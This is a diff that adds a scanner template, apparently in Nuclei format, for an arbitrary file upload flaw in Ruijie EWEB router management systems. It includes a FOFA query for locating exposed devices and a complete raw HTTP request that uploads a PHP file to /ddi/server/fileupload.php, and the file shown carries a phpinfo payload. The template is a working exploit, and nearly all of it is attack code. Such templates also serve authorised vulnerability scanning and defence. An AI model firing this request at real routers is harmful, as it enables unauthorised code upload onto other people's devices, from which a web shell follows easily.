@@ -1,0 +1,46 @@
+id: poc-gpz0gs29rn5ef0z3
+info:
+  name: 锐捷EWEB路由器-fileupload.php存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gpz0gs29rn5ef0z3'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gpz0gs29rn5ef0z3
+    fofa: title="锐捷网络-EWEB网管系统"
+http:
+- raw:
+  - 'POST /ddi/server/fileupload.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    Accept-Encoding: gzip, deflate, br
+
+    Connection: keep-alive
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXarDTbMzZe2hdNu2
+
+
+    ------WebKitFormBoundaryXarDTbMzZe2hdNu2
+
+    Content-Disposition: form-data; name="uploadDir"
+
+
+    upload
+
+    ------WebKitFormBoundaryXarDTbMzZe2hdNu2
+
+    Content-Disposition: form-data; name="file";filename="123.php"
+
+
+    <?php phpinfo();?>
+
+    ------WebKitFormBoundaryXarDTbMzZe2hdNu2--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
